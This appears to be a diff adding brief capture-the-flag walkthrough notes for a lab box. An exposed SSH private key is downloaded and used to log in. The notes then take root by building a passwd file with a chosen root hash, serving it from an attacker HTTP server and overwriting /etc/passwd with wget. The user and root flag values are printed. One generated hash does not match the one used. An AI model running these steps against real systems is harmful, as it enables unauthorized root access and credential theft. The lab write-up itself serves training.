@@ -1,0 +1,70 @@
+https://www.youtube.com/watch?v=fq2EKJ3-fp8
+
+
+
+
+				RECON
+
+(found possible cred)
+user:Jessie
+
+/sitemap
+(possible sql injection)
+
+/sitemap/.ssh
+id_rsa
+(private key found)
+
+$sudo wget http://10.10.182.174/sitemap/.ssh/id_rsa 
+$sudo mv id_rsa jessie_id_rsa
+$sudo chmod 600 jessie_id_rsa 
+
+
+
+				SSH
+$sudo ssh -i jessie_id_rsa jessie@$IP
+
+$find | grep flag
+
+$cd Documents
+$cat user_flag.txt
+057c67131c3d5e42dd5cd3075b198ff6
+
+
+				PRIVESC
+
+$sudo scp -i jessie_id_rsa /opt/peas-privesc/linPEAS/linpeas.sh jessie@$IP:/dev/shm/
+
+$cat /etc/passwd
+$sudo cp /etc/passwd /dev/shm
+
+
+				ROOT PASSWD Change
+(on attacker)
+$python3
+$import crypt
+$crypt.crypt("hellowurld")
+
+"$6$2N.UMpTjvTBg3PUJ$S4AS.FeCzgd/yCy6eFNBrmz6uLD6.TM8hGBbw6Tcat2QdJzxmpnmp8KiBgFl8HPFOQ6xsuHW/kB6C0Zr04ilf."
+
+(edit rootline in a new passwd file)
+
+root:$6$d8F62kqj..dWa7oJ$5gVGs8t/IounN0ZhIQpWcYgjMddWBDp.di28JA2Lwn/6OcyiqCqnGs9QKDzt8HWkI8tlOGIvkU/1mKF9v05ON0:0:0:root:/root:/bin/bash
+
+
+				PRIVESC - COntinued
+(attacker)
+$python -m http.server 81
+
+(target)
+$sudo wget http://10.2.26.235:81/passwd -O /etc/passwd
+
+
+$su root
+hellowurld
+
+
+$cd /root
+
+$cat root_flag.txt
+b1b968b37519ad1daa6408188649263d
